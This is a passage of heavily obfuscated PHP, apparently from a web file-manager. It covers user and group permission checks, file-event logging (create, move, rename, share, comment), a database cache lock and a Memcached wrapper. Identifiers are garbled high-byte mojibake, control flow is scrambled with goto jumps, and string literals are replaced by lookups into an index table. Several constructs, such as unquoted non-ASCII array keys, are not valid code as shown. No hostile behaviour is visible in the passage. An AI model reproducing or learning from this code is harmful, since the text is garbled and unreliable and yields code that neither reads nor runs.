$this->sourceAuthInfo($cœöàÕô¼[$E›æî÷Ø[1868]]); } return $cœöàÕô¼; } public function authArrayCheck($BÌÔ÷ç¯×“, $bÈ˜…Ñ÷•ï = false) { goto cº·§ßì¼„; EŞ²èŞèìŸ: $cÈ³æŞ¯£¡ = 0; $E¹‘äé”ˆ = 0; $FäÒÅí¶ñ = 0; goto a¤Ãé‘ì‡; eÃ—Ò•…‰×: foreach ($BÌÔ÷ç¯×“ as $A÷„––ê”Ç) { $F×¼»íßà = $this->authInfo($A÷„––ê”Ç); if (!$F×¼»íßà) { continue; } $b¢Æ¶¼õ• = $A÷„––ê”Ç[$f…“‰ÔĞÓŒ[478]]; $Fˆ˜îˆ§›¥ = intval($F×¼»íßà[$f…“‰ÔĞÓŒ[400]]); if ($A÷„––ê”Ç[$f…“‰ÔĞÓŒ[398]] == SourceModel::TYPE_USER && $b¢Æ¶¼õ• == $bÈ˜…Ñ÷•ï) { $cÈ³æŞ¯£¡ = !0; $FäÒÅí¶ñ = $F×¼»íßà; $E¹‘äé”ˆ = $Fˆ˜îˆ§›¥; } else { if ($A÷„––ê”Ç[$f…“‰ÔĞÓŒ[398]] == SourceModel::TYPE_GROUP && $this->groupContainUser($b¢Æ¶¼õ•, $bÈ˜…Ñ÷•ï)) { $C‡à•ó¨Ùô = !0; $FåÕ…Õƒ = $this->groupStepToUserGroup($b¢Æ¶¼õ•, $bÈ˜…Ñ÷•ï); if ($FåÕ…Õƒ < $b¯ó»¨Š¶Å) { $b¯ó»¨Š¶Å = $FåÕ…Õƒ; $fñÂì‡Ÿ‰ = $Fˆ˜îˆ§›¥; $D…Ø¹ÛÄïÑ = $F×¼»íßà; $FÃÖ¡ô…¢ç = $b¢Æ¶¼õ•; } if ($FåÕ…Õƒ == $b¯ó»¨Š¶Å && $Fˆ˜îˆ§›¥ >= $fñÂì‡Ÿ‰) { $fñÂì‡Ÿ‰ = $Fˆ˜îˆ§›¥; $D…Ø¹ÛÄïÑ = $F×¼»íßà; $FÃÖ¡ô…¢ç = $b¢Æ¶¼õ•; } } else { if ($b¢Æ¶¼õ• == $f…“‰ÔĞÓŒ[491]) { $b‹Ó·´Ùéé = !0; $F¬ó¡¿Åİ = $F×¼»íßà; $BÌÄŞã«Ë = $Fˆ˜îˆ§›¥; } } } } if ($cÈ³æŞ¯£¡) { $bŞ¥áœÎÁ = $E¹‘äé”ˆ; $F×¼»íßà = $FäÒÅí¶ñ; $D¹¼ ÂŠÈ = LNG($f…“‰ÔĞÓŒ[1869]); } else { if ($C‡à•ó¨Ùô) { $bŞ¥áœÎÁ = $fñÂì‡Ÿ‰; $F×¼»íßà = $D…Ø¹ÛÄïÑ; $fä‰¢´Šµ = Model($f…“‰ÔĞÓŒ[480])->getInfo($FÃÖ¡ô…¢ç); $D¹¼ ÂŠÈ = $f…“‰ÔĞÓŒ[159] . $fä‰¢´Šµ[$f…“‰ÔĞÓŒ[485]] . $f…“‰ÔĞÓŒ[1870] . LNG($f…“‰ÔĞÓŒ[1871]); } else { if ($b‹Ó·´Ùéé) { $bŞ¥áœÎÁ = $BÌÄŞã«Ë; $F×¼»íßà = $F¬ó¡¿Åİ; $D¹¼ ÂŠÈ = LNG($f…“‰ÔĞÓŒ[1842]); } else { $bŞ¥áœÎÁ = 0; $F×¼»íßà = !1; $D¹¼ ÂŠÈ = $f…“‰ÔĞÓŒ[33]; } } } $FâÂŒ””íÑ = array($f…“‰ÔĞÓŒ[1861] => intval($bŞ¥áœÎÁ), $f…“‰ÔĞÓŒ[1845] => $F×¼»íßà, $f…“‰ÔĞÓŒ[1862] => $D¹¼ ÂŠÈ, $f…“‰ÔĞÓŒ[1854] => $A÷„––ê”Ç[$f…“‰ÔĞÓŒ[390]]); goto D²ã–Ñ‡Áó; cº·§ßì¼„: $f…“‰ÔĞÓŒ =& $_SERVER[¹Ò‹Ò¹]; if (!$BÌÔ÷ç¯×“) { return array($f…“‰ÔĞÓŒ[401] => 0, $f…“‰ÔĞÓŒ[440] => !1); } $bÈ˜…Ñ÷•ï = $bÈ˜…Ñ÷•ï ? $bÈ˜…Ñ÷•ï : USER_ID; goto EŞ²èŞèìŸ; f‰ŸóÛô: $b¯ó»¨Š¶Å = 1000; $FÃÖ¡ô…¢ç = 0; $b‹Ó·´Ùéé = 0; goto C™Ä–Šß¢Ó; D²ã–Ñ‡Áó: return $FâÂŒ””íÑ; goto Fèø ¨•Şß; a¤Ãé‘ì‡: $C‡à•ó¨Ùô = 0; $fñÂì‡Ÿ‰ = 0; $D…Ø¹ÛÄïÑ = 0; goto f‰ŸóÛô; C™Ä–Šß¢Ó: $BÌÄŞã«Ë = 0; $F¬ó¡¿Åİ = 0; $A÷„––ê”Ç = array($f…“‰ÔĞÓŒ[390] => 0); goto eÃ—Ò•…‰×; Fèø ¨•Şß: } private function groupContainUser($DùŒš´†·ë, $dÀ³¿³šƒÉ = false) { return in_array($DùŒš´†·ë, $this->userGroupParents($dÀ³¿³šƒÉ)); } private function groupStepToUserGroup($b‡±ãøÓíĞ, $fÆ¤º«îâÅ = false) { goto FáğÌè´†; B­”·´¤Ë: $fª‘«¯àÔ = $GLOBALS[$C´½­…äˆ¸[6]][$C´½­…äˆ¸[87]][$C´½­…äˆ¸[1761]] == 1; $fÎ×åØ÷·™ = $fª‘«¯àÔ ? 3 : 2; foreach ($báÇ©ùÜÜ as $eù§ù…éâô) { if ($eù§ù…éâô[$C´½­…äˆ¸[1667]] == $b‡±ãøÓíĞ) { return 0; } $cÙƒŠñ¦ƒå = explode($C´½­…äˆ¸[47], trim($eù§ù…éâô[$C´½­…äˆ¸[481]], $C´½­…äˆ¸[47])); if ($cÙƒŠñ¦ƒå[0] == $C´½­…äˆ¸[491] && count($cÙƒŠñ¦ƒå) > $fÎ×åØ÷·™) { $aÈ¬ÂËîÁ¼ = array_reverse(array_slice($cÙƒŠñ¦ƒå, $fÎ×åØ÷·™)); $bŞ­á‰åô = array_search($b‡±ãøÓíĞ, $aÈ¬ÂËîÁ¼); if ($bŞ­á‰åô !== !1 && $bŞ­á‰åô + 1 <= $e±Ùá¸ÛìÂ) { $e±Ùá¸ÛìÂ = $bŞ­á‰åô + 1; } } } goto f£š‚ÇŒŞ¥; f£š‚ÇŒŞ¥: return $e±Ùá¸ÛìÂ; goto DŸ…òĞÂ˜; FáğÌè´†: $C´½­…äˆ¸ =& $_SERVER[¹Ò‹Ò¹]; $báÇ©ùÜÜ = $this->userGroupList($fÆ¤º«îâÅ); $e±Ùá¸ÛìÂ = 1000; goto B­”·´¤Ë; DŸ…òĞÂ˜: } private function userGroupList($EÁÂİ§± ã = false) { $cºØè“Éìä =& $_SERVER[¹Ò‹Ò¹]; static $fÉŒÑùç½ï = array(); if (isset($fÉŒÑùç½ï[$EÁÂİ§± ã])) { return $fÉŒÑùç½ï[$EÁÂİ§± ã]; } $EçØ‰ÁÃ² = Model($cºØè“Éìä[501])->getInfo($EÁÂİ§± ã); $fÉŒÑùç½ï[$EÁÂİ§± ã] = array_to_keyvalue($EçØ‰ÁÃ²[$cºØè“Éìä[1843]], $cºØè“Éìä[1667]); return $fÉŒÑùç½ï[$EÁÂİ§± ã]; } public function userGroupParents($A¡ê±ƒ…‹) { goto b‹Ê‹è•É‡; Dš÷îÅ™äŸ: $dæ¹§ãÛ›[$A¡ê±ƒ…‹] = array_unique($Eåï‰ÎğÈæ); return $dæ¹§ãÛ›[$A¡ê±ƒ…‹]; goto f¶Íà¾àÜî; b‹Ê‹è•É‡: $cĞ™ƒ“ù³ =& $_SERVER[¹Ò‹Ò¹]; static $dæ¹§ãÛ› = array(); $A¡ê±ƒ…‹ = $A¡ê±ƒ…‹ ? $A¡ê±ƒ…‹ : USER_ID; goto AËºë‚äì; dï×Üµ‹¼•: $BàĞ³„ùêƒ = $GLOBALS[$cĞ™ƒ“ù³[6]][$cĞ™ƒ“ù³[87]][$cĞ™ƒ“ù³[1761]] == 1; $a‰öâ§ì‰Ù = $BàĞ³„ùêƒ ? 3 : 2; foreach ($f×Û‰»ƒ¿œ as $E¹ˆ°¸È…) { $b¥ ¬›ƒä‹ = array($E¹ˆ°¸È…[$cĞ™ƒ“ù³[1667]]); $dÈö§£ÙÃã = explode($cĞ™ƒ“ù³[47], trim($E¹ˆ°¸È…[$cĞ™ƒ“ù³[481]], $cĞ™ƒ“ù³[47])); if ($dÈö§£ÙÃã[0] == $cĞ™ƒ“ù³[491] && count($dÈö§£ÙÃã) > $a‰öâ§ì‰Ù) { $a¹²¾İ°¬ = array_slice($dÈö§£ÙÃã, $a‰öâ§ì‰Ù); $b¥ ¬›ƒä‹ = array_merge($b¥ ¬›ƒä‹, array_reverse($a¹²¾İ°¬)); } $Eåï‰ÎğÈæ = array_merge($Eåï‰ÎğÈæ, $b¥ ¬›ƒä‹); } goto Dš÷îÅ™äŸ; AËºë‚äì: if (isset($dæ¹§ãÛ›[$A¡ê±ƒ…‹])) { return $dæ¹§ãÛ›[$A¡ê±ƒ…‹]; } $f×Û‰»ƒ¿œ = $this->userGroupList($A¡ê±ƒ…‹); $Eåï‰ÎğÈæ = array(); goto dï×Üµ‹¼•; f¶Íà¾àÜî: } public function authTargetInfoMake($fğ±Ÿ´ƒŒ­) { goto aó¿˜î™Ú; dÚƒõÃİá: foreach ($fğ±Ÿ´ƒŒ­ as $fÎ‡´‡Àè) { if ($fÎ‡´‡Àè[$aÅ¼èäğ´™[398]] == SourceModel::TYPE_USER) { $DÍ—¢”è¶ô[] = intval($fÎ‡´‡Àè[$aÅ¼èäğ´™[478]]); } else { if ($fÎ‡´‡Àè[$aÅ¼èäğ´™[398]] == SourceModel::TYPE_GROUP) { $fˆ“„¬²ˆÏ[] = intval($fÎ‡´‡Àè[$aÅ¼èäğ´™[478]]); } } } if ($DÍ—¢”è¶ô) { $DÍ—¢”è¶ô = Model($aÅ¼èäğ´™[497])->userListInfo($DÍ—¢”è¶ô); } if ($fˆ“„¬²ˆÏ) { $DÂ’‚†£ß = array($aÅ¼èäğ´™[1747] => array($aÅ¼èäğ´™[405], $fˆ“„¬²ˆÏ)); $fˆ“„¬²ˆÏ = Model($aÅ¼èäğ´™[480])->field($aÅ¼èäğ´™[1872])->where($DÂ’‚†£ß)->select(); $fˆ“„¬²ˆÏ = array_to_keyvalue($fˆ“„¬²ˆÏ, $aÅ¼èäğ´™[1667]); } goto D•áä¡ËĞŞ; D•áä¡ËĞŞ: return array($aÅ¼èäğ´™[1873] => $DÍ—¢”è¶ô, $aÅ¼èäğ´™[1874] => $fˆ“„¬²ˆÏ); goto Dá†¾Š¤´é; aó¿˜î™Ú: $aÅ¼èäğ´™ =& $_SERVER[¹Ò‹Ò¹]; $DÍ—¢”è¶ô = array(); $fˆ“„¬²ˆÏ = array(); goto dÚƒõÃİá; Dá†¾Š¤´é: } public function authInfo($fèã’ô÷Ì) { $DŒ‡²§åáÚ =& $_SERVER[¹Ò‹Ò¹]; if ($fèã’ô÷Ì[$DŒ‡²§åáÚ[1764]]) { $a÷í“§Œ“‘ = Model($DŒ‡²§åáÚ[1836])->listData($fèã’ô÷Ì[$DŒ‡²§åáÚ[1764]]); if (!$a÷í“§Œ“‘) { return !1; $fãÕã¢ô˜ï = Model($DŒ‡²§åáÚ[1836])->listData(); $dæ£œèŠù = array_filter_by_field($fãÕã¢ô˜ï, $DŒ‡²§åáÚ[400], $DŒ‡²§åáÚ[491]); return $dæ£œèŠù; } $BÙÙ»‰¼ÊŸ = array_field_key($a÷í“§Œ“‘, array($DŒ‡²§åáÚ[388], $DŒ‡²§åáÚ[28], $DŒ‡²§åáÚ[400], $DŒ‡²§åáÚ[1688], $DŒ‡²§åáÚ[1690])); $BÙÙ»‰¼ÊŸ[$DŒ‡²§åáÚ[1875]] = $fèã’ô÷Ì; return $BÙÙ»‰¼ÊŸ; } else { return array($DŒ‡²§åáÚ[406] => 0, $DŒ‡²§åáÚ[1673] => $fèã’ô÷Ì[$DŒ‡²§åáÚ[1818]], $DŒ‡²§åáÚ[407] => $DŒ‡²§åáÚ[33], $DŒ‡²§åáÚ[1688] => $DŒ‡²§åáÚ[1876]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\x6f\x75\x72\143\x65\x5f\x65\x76\x65\156\164"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\124\x69\x6d\145", "\164\x69\x6d\x65", "\151\x6e\x73\x65\x72\x74", "\x66\x75\156\143\x74\x69\x6f\x6e"), array("\144\145\x73\143", '', "\x69\156\x73\145\x72\x74\x2c\x75\160\x64\141\x74\145\x2c\x73\x65\x6c\x65\143\x74", "\152\163\x6f\156")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($eõÃ¨õŸ‚†, $CêÈ‡ğÈ½, $CÖÁšÏì = '') { goto Fß‘Ôä‘Ìù; dâ®İùÒ¢Ñ: $CßÇŒÀ¹¢é = array($DÍìõ†÷•œ[404] => $eõÃ¨õŸ‚†, $DÍìõ†÷•œ[1877] => $bÅ®Â¦Øôº[$DÍìõ†÷•œ[472]], $DÍìõ†÷•œ[1878] => $bÅ®Â¦Øôº[$DÍìõ†÷•œ[28]], $DÍìõ†÷•œ[489] => $bÅ®Â¦Øôº[$DÍìõ†÷•œ[489]], $DÍìõ†÷•œ[1496] => USER_ID, $DÍìõ†÷•œ[409] => $CêÈ‡ğÈ½, $DÍìõ†÷•œ[1498] => $CÖÁšÏì); $this->addSystemLog($CêÈ‡ğÈ½, $CßÇŒÀ¹¢é); return $this->add($CßÇŒÀ¹¢é); goto e¤İµ£¥«¿; Fß‘Ôä‘Ìù: $DÍìõ†÷•œ =& $_SERVER[¹Ò‹Ò¹]; if (!$this->eventSave) { return; } $bÅ®Â¦Øôº = Model($DÍìõ†÷•œ[1179])->sourceInfo($eõÃ¨õŸ‚†); goto Fö¶¿¥¨ÚÛ; Fö¶¿¥¨ÚÛ: if (!$bÅ®Â¦Øôº) { return !1; } if ($this->isCacheEvent($bÅ®Â¦Øôº, $CêÈ‡ğÈ½)) { return; } if ($CÖÁšÏì && is_string($CÖÁšÏì)) { $CÖÁšÏì = array($DÍìõ†÷•œ[1700] => $CÖÁšÏì); } goto dâ®İùÒ¢Ñ; e¤İµ£¥«¿: } private function addSystemLog($d»ö’§áœÀ, $a„ÒÜÍ£ ¨) { $a°³ğÜ¡‘† =& $_SERVER[¹Ò‹Ò¹]; if ($d»ö’§áœÀ == $a°³ğÜ¡‘†[1879]) { $d»ö’§áœÀ = $a„ÒÜÍ£ ¨[$a°³ğÜ¡‘†[425]][$a°³ğÜ¡‘†[1880]]; } else { if (in_array($d»ö’§áœÀ, array($a°³ğÜ¡‘†[1644], $a°³ğÜ¡‘†[1881]))) { $d»ö’§áœÀ = $a„ÒÜÍ£ ¨[$a°³ğÜ¡‘†[425]][$a°³ğÜ¡‘†[707]]; } } $e–¤¹¬ÛÍÒ = array_merge($a„ÒÜÍ£ ¨, array($a°³ğÜ¡‘†[1882] => $a„ÒÜÍ£ ¨[$a°³ğÜ¡‘†[390]], $a°³ğÜ¡‘†[1883] => $a„ÒÜÍ£ ¨[$a°³ğÜ¡‘†[1883]])); Model($a°³ğÜ¡‘†[1608])->addLog($a°³ğÜ¡‘†[1884] . $d»ö’§áœÀ, $e–¤¹¬ÛÍÒ); } private function isCacheEvent($E¦©ŞŸ©´, $eŠ‰ĞÆÍØ) { if ($E¦©ŞŸ©´[$_SERVER[¹Ò‹Ò¹][398]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($E¬……“¥¤Ş, $a‚ó¨ŠÌ„´) { $B¨Ô×ÆÎï— =& $_SERVER[¹Ò‹Ò¹]; $f·¸×Ï ç = Model($B¨Ô×ÆÎï—[1179])->sourceInfo($E¬……“¥¤Ş); $dàÙ£¬Ù©÷ = array($B¨Ô×ÆÎï—[1880] => $a‚ó¨ŠÌ„´, $B¨Ô×ÆÎï—[28] => $f·¸×Ï ç[$B¨Ô×ÆÎï—[28]]); return $this->addEvent($E¬……“¥¤Ş, $B¨Ô×ÆÎï—[1879], $dàÙ£¬Ù©÷); } public function eventFileEdit($Fñ†—´À‹å) { $bğ¡ŞÌ´†í =& $_SERVER[¹Ò‹Ò¹]; $FÒÔ¿¼ñ£  = array($bğ¡ŞÌ´†í[1885] => $_SERVER[$bğ¡ŞÌ´†í[1886]], $bğ¡ŞÌ´†í[1887] => strtolower(ACTION)); return $this->addEvent($Fñ†—´À‹å, $bğ¡ŞÌ´†í[1634], $FÒÔ¿¼ñ£ ); } public function eventRecycle($F‹ÇÄ‡Šİµ, $c¨Ó¨«È™ˆ) { return $this->addEvent($F‹ÇÄ‡Šİµ, $_SERVER[¹Ò‹Ò¹][1881], $c¨Ó¨«È™ˆ); } public function eventRemove($c ¼«ğ›) { $A¯îêÏ¦Èà =& $_SERVER[¹Ò‹Ò¹]; $Aš¾ÎˆÏªâ = Model($A¯îêÏ¦Èà[1179])->sourceInfo($c ¼«ğ›); $A°İ¤Ó†ß = $Aš¾ÎˆÏªâ[$A¯îêÏ¦Èà[28]]; return $this->addEvent($Aš¾ÎˆÏªâ[$A¯îêÏ¦Èà[472]], $A¯îêÏ¦Èà[1633], $A°İ¤Ó†ß); } public function eventShare($EĞ´¨¶çñâ, $eé©ñÙ”ì) { return $this->addEvent($EĞ´¨¶çñâ, $_SERVER[¹Ò‹Ò¹][1644], $eé©ñÙ”ì); } public function eventMove($bñ²¯·¦¨¥, $D£ĞÏğÈ¬—, $C—ğË÷’å) { goto cÆš¹»±ˆÃ; cÆš¹»±ˆÃ: $EÁØŸ¯ÜÇ =& $_SERVER[¹Ò‹Ò¹]; $fÒ³¼£§— = Model($EÁØŸ¯ÜÇ[1179]); $b«µ•‹§´ = $fÒ³¼£§—->sourceInfo($bñ²¯·¦¨¥); goto DÄ‰Ô²Ï¤Ó; aãÊôÊš: $this->addEvent($D£ĞÏğÈ¬—, $EÁØŸ¯ÜÇ[1891], $E…Ú½­ÍÃê); goto CĞ´äÕ½ÖË; DÄ‰Ô²Ï¤Ó: $AîˆÏ»ãœŒ = $fÒ³¼£§—->sourceInfo($D£ĞÏğÈ¬—); $Cä¡‹Ø½ÖÄ = $fÒ³¼£§—->sourceInfo($C—ğË÷’å); $E…Ú½­ÍÃê = array($EÁØŸ¯ÜÇ[1030] => $D£ĞÏğÈ¬—, $EÁØŸ¯ÜÇ[1888] => $AîˆÏ»ãœŒ[$EÁØŸ¯ÜÇ[28]], $EÁØŸ¯ÜÇ[1868] => $AîˆÏ»ãœŒ[$EÁØŸ¯ÜÇ[489]], $EÁØŸ¯ÜÇ[1031] => $C—ğË÷’å, $EÁØŸ¯ÜÇ[1889] => $Cä¡‹Ø½ÖÄ[$EÁØŸ¯ÜÇ[28]], $EÁØŸ¯ÜÇ[1890] => $Cä¡‹Ø½ÖÄ[$EÁØŸ¯ÜÇ[489]]); goto F®©¯Úˆ‘•; F®©¯Úˆ‘•: $this->addEvent($bñ²¯·¦¨¥, $EÁØŸ¯ÜÇ[515], $E…Ú½­ÍÃê); $b«µ•‹§´ = $fÒ³¼£§—->sourceInfo($bñ²¯·¦¨¥); $E…Ú½­ÍÃê = array($EÁØŸ¯ÜÇ[390] => $b«µ•‹§´[$EÁØŸ¯ÜÇ[390]], $EÁØŸ¯ÜÇ[28] => $b«µ•‹§´[$EÁØŸ¯ÜÇ[28]]); goto aãÊôÊš; CĞ´äÕ½ÖË: } public function eventCopy($f’‚ÄÑ°—À) { $this->eventCreate($f’‚ÄÑ°—À, $_SERVER[¹Ò‹Ò¹][513]); } public function eventRename($D’ß°ºŒ­, $E¶µã¶ê½™, $D“÷¸¤àø) { $d±¿”©°êø =& $_SERVER[¹Ò‹Ò¹]; $BŞÓ°ÍĞÓÍ = array($d±¿”©°êø[1030] => $E¶µã¶ê½™, $d±¿”©°êø[1031] => $D“÷¸¤àø); return $this->addEvent($D’ß°ºŒ­, $d±¿”©°êø[1195], $BŞÓ°ÍĞÓÍ); } public function eventAddComment($E“‚¯Ò’Ëº, $DŒëÛÂÜíÙ) { return $this->addEvent($E“‚¯Ò’Ëº, $_SERVER[¹Ò‹Ò¹][1892], $DŒëÛÂÜíÙ); } public function eventAddDesc($c†«öàÚ…Õ, $B‚†Ú‰÷ª) { return $this->addEvent($c†«öàÚ…Õ, $_SERVER[¹Ò‹Ò¹][1893], $B‚†Ú‰÷ª); } public function listBySource($c½Æ±Œ½°ç) { goto CË¸Ã­‚Å’; F×Â“×êÃ: return $this->eventListParse($Cã¨ãëµğ, $c½Æ±Œ½°ç); goto f•„ç¤ˆ»„; F×…´™åÓ: if ($d¡¦‰µÃ»é[$aÆìö„Ä¿[397]] == $aÆìö„Ä¿[86]) { $B§¨½¨‚ƒ¾ = Model($aÆìö„Ä¿[1179])->listSearchChildren($c½Æ±Œ½°ç, 20000); $B§¨½¨‚ƒ¾[] = $c½Æ±Œ½°ç . $aÆìö„Ä¿[373]; $AÌÎ™Ç³ğÅ = array($aÆìö„Ä¿[390] => array($aÆìö„Ä¿[7], $B§¨½¨‚ƒ¾)); } $Cã¨ãëµğ = $this->where($AÌÎ™Ç³ğÅ)->order($aÆìö„Ä¿[1894])->selectPage(); if ($Cã¨ãëµğ[$aÆìö„Ä¿[362]][$aÆìö„Ä¿[363]] == 0) { $Cã¨ãëµğ[$aÆìö„Ä¿[362]][$aÆìö„Ä¿[363]] = 1; $Cã¨ãëµğ[$aÆìö„Ä¿[365]] = array(array($aÆìö„Ä¿[404] => $c½Æ±Œ½°ç, $aÆìö„Ä¿[1877] => $d¡¦‰µÃ»é[$aÆìö„Ä¿[472]], $aÆìö„Ä¿[1496] => $d¡¦‰µÃ»é[$aÆìö„Ä¿[426]], $aÆìö„Ä¿[409] => $aÆìö„Ä¿[1895], $aÆìö„Ä¿[410] => $d¡¦‰µÃ»é[$aÆìö„Ä¿[192]], $aÆìö„Ä¿[1498] => $aÆìö„Ä¿[33])); } goto F×Â“×êÃ; CË¸Ã­‚Å’: $aÆìö„Ä¿ =& $_SERVER[¹Ò‹Ò¹]; $d¡¦‰µÃ»é = Model($aÆìö„Ä¿[1179])->sourceInfo($c½Æ±Œ½°ç); $AÌÎ™Ç³ğÅ = array($aÆìö„Ä¿[404] => $c½Æ±Œ½°ç); goto F×…´™åÓ; f•„ç¤ˆ»„: } private function eventListParse($Eé¢Ö³¼ß·, $a¤Í‡ó±¼) { goto B‹íê²õªŸ; eª¢ÃìÎ ’: $E¼ÛÂ†ã = array_unique($E¼ÛÂ†ã); $c„œïÏ»ˆ˜ = array_unique(array_to_keyvalue($Bº—…¼Îš¹, $BëáÙñÈŠ»[33], $BëáÙñÈŠ»[1504])); $A‹÷¿ÃòÅÀ = Model($BëáÙñÈŠ»[501])->userListInfo($c„œïÏ»ˆ˜); goto Fâ®ìöÅ¡¸; Cˆ‹Š…Š‚×: $Eé¢Ö³¼ß·[$BëáÙñÈŠ»[365]] = $Bº—…¼Îš¹; return $Eé¢Ö³¼ß·; goto fÂ›º©±„·; B‹íê²õªŸ: $BëáÙñÈŠ» =& $_SERVER[¹Ò‹Ò¹]; $Bº—…¼Îš¹ = $Eé¢Ö³¼ß·[$BëáÙñÈŠ»[365]]; $E¼ÛÂ†ã = array_to_keyvalue($Bº—…¼Îš¹, $BëáÙñÈŠ»[33], $BëáÙñÈŠ»[390]); goto c‘†ÃÉğà; c‘†ÃÉğà: $fòØ„©¹½³ = array_to_keyvalue($Bº—…¼Îš¹, $BëáÙñÈŠ»[33], $BëáÙñÈŠ»[1883]); foreach ($Bº—…¼Îš¹ as $Aó÷¹™Üè) { $Aô¹ì”ŸÈ  = $Aó÷¹™Üè[$BëáÙñÈŠ»[425]]; if ($Aó÷¹™Üè[$BëáÙñÈŠ»[29]] == $BëáÙñÈŠ»[515] && isset($Aô¹ì”ŸÈ [$BëáÙñÈŠ»[1030]])) { $E¼ÛÂ†ã[] = $Aô¹ì”ŸÈ [$BëáÙñÈŠ»[1030]] . $BëáÙñÈŠ»[33]; $E¼ÛÂ†ã[] = $Aô¹ì”ŸÈ [$BëáÙñÈŠ»[1031]] . $BëáÙñÈŠ»[33]; } if ($Aó÷¹™Üè[$BëáÙñÈŠ»[29]] == $BëáÙñÈŠ»[1891] && isset($Aô¹ì”ŸÈ [$BëáÙñÈŠ»[390]])) { $E¼ÛÂ†ã[] = $Aô¹ì”ŸÈ [$BëáÙñÈŠ»[390]] . $BëáÙñÈŠ»[33]; } } $E¼ÛÂ†ã = array_merge($E¼ÛÂ†ã, $fòØ„©¹½³, array($a¤Í‡ó±¼ . $BëáÙñÈŠ»[33])); goto eª¢ÃìÎ ’; Fâ®ìöÅ¡¸: $bÆ‹„‘ï· = Model($BëáÙñÈŠ»[769])->sourceListInfo($E¼ÛÂ†ã, !0); foreach ($Bº—…¼Îš¹ as &$Aó÷¹™Üè) { if ($Aó÷¹™Üè[$BëáÙñÈŠ»[29]] == $BëáÙñÈŠ»[515] && isset($Aó÷¹™Üè[$BëáÙñÈŠ»[425]][$BëáÙñÈŠ»[1030]])) { $Aó÷¹™Üè[$BëáÙñÈŠ»[425]][$BëáÙñÈŠ»[1030]] = $bÆ‹„‘ï·[$Aó÷¹™Üè[$BëáÙñÈŠ»[425]][$BëáÙñÈŠ»[1030]]]; $Aó÷¹™Üè[$BëáÙñÈŠ»[425]][$BëáÙñÈŠ»[1031]] = $bÆ‹„‘ï·[$Aó÷¹™Üè[$BëáÙñÈŠ»[425]][$BëáÙñÈŠ»[1031]]]; } if ($Aó÷¹™Üè[$BëáÙñÈŠ»[29]] == $BëáÙñÈŠ»[1891] && isset($Aó÷¹™Üè[$BëáÙñÈŠ»[425]][$BëáÙñÈŠ»[390]])) { $Aó÷¹™Üè[$BëáÙñÈŠ»[425]][$BëáÙñÈŠ»[390]] = $bÆ‹„‘ï·[$Aó÷¹™Üè[$BëáÙñÈŠ»[425]][$BëáÙñÈŠ»[390]]]; } $Aó÷¹™Üè[$BëáÙñÈŠ»[84]] = $bÆ‹„‘ï·[$Aó÷¹™Üè[$BëáÙñÈŠ»[390]]]; $Aó÷¹™Üè[$BëáÙñÈŠ»[1896]] = $bÆ‹„‘ï·[$Aó÷¹™Üè[$BëáÙñÈŠ»[1883]]]; if ($Aó÷¹™Üè[$BëáÙñÈŠ»[29]] == $BëáÙñÈŠ»[1633]) { $Aó÷¹™Üè[$BëáÙñÈŠ»[1896]] = $Aó÷¹™Üè[$BëáÙñÈŠ»[84]]; $Aó÷¹™Üè[$BëáÙñÈŠ»[1883]] = $Aó÷¹™Üè[$BëáÙñÈŠ»[1896]][$BëáÙñÈŠ»[390]]; $Aó÷¹™Üè[$BëáÙñÈŠ»[84]] = !1; $Aó÷¹™Üè[$BëáÙñÈŠ»[390]] = $BëáÙñÈŠ»[33]; } $Aó÷¹™Üè[$BëáÙñÈŠ»[1826]] = $A‹÷¿ÃòÅÀ[$Aó÷¹™Üè[$BëáÙñÈŠ»[1504]]]; } unset($Aó÷¹™Üè); goto Cˆ‹Š…Š‚×; fÂ›º©±„·: } public function removeBySource($Fò‚±‡†ĞÇ) { $cğ»ÈÇÚ¢ = array($_SERVER[¹Ò‹Ò¹][404] => $Fò‚±‡†ĞÇ); $this->where($cğ»ÈÇÚ¢)->remove(); } } goto d®Ï…‘ÃÒÎ; DØ»Åô·Ñß: class CacheLockDatabase { public function lock($FÉÅ†²®õ, $dë¦—ÍŒé = 0) { $FÜŸ¬ãáé = Model($_SERVER[¹Ò‹Ò¹][773]); $bñàˆÓáÒÊ = microtime(!0) + $dë¦—ÍŒé; while (microtime(!0) < $bñàˆÓáÒÊ) { $dÖ´„†ƒâ = $FÜŸ¬ãáé->get($FÉÅ†²®õ); if (!$dÖ´„†ƒâ || $dÖ´„†ƒâ < microtime(!0)) { $fŠß¸ñ·§ = $FÜŸ¬ãáé->set($FÉÅ†²®õ, $bñàˆÓáÒÊ); if ($fŠß¸ñ·§) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($bâÖ‡ë‡´›) { return Model($_SERVER[¹Ò‹Ò¹][773])->get($bâÖ‡ë‡´›); } public function unlock($FªÆå×•§Î) { Model($_SERVER[¹Ò‹Ò¹][773])->remove($FªÆå×•§Î); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($dçŞæ‡ÖÌ–, $eµŒò‡º˜æ) { $Dˆ°×áç† =& $_SERVER[¹Ò‹Ò¹]; if (!class_exists($Dˆ°×áç†[807])) { show_json($Dˆ°×áç†[808], !1); } $this->cacheTime = $eµŒò‡º˜æ; $this->handle = new Memcached(); if (is_array($dçŞæ‡ÖÌ–[$Dˆ°×áç†[809]]) && count($dçŞæ‡ÖÌ–[$Dˆ°×áç†[809]]) >= 1) { foreach ($dçŞæ‡ÖÌ–[$Dˆ°×áç†[809]] as $b¦£Œ×„ğÒ) { $B¯ÇÖë¹…‡ = explode($Dˆ°×áç†[4], $b¦£Œ×„ğÒ); $this->handle->addServer($B¯ÇÖë¹…‡[0], $B¯ÇÖë¹…‡[1]); } } else { $this->handle->addServer($dçŞæ‡ÖÌ–[$Dˆ°×áç†[174]], $dçŞæ‡ÖÌ–[$Dˆ°×áç†[175]]); } } public function set($EÁØêÌ÷±„, $eŒ©î‘Ûº, $aç´íŠ¡ºÎ = false) { $aç´íŠ¡ºÎ = $aç´íŠ¡ºÎ ? $aç´íŠ¡ºÎ : $this->cacheTime; return $this->handle->set($EÁØêÌ÷±„, $eŒ©î‘Ûº, $aç´íŠ¡ºÎ); } public function get($bÍòÜ¬‰„Š) { return $this->handle->get($bÍòÜ¬‰„Š); } public function remove($f¬»ç©Œ­Ø) { return $this->handle->delete($f¬»ç©Œ­Ø); } public function deleteAll() { return 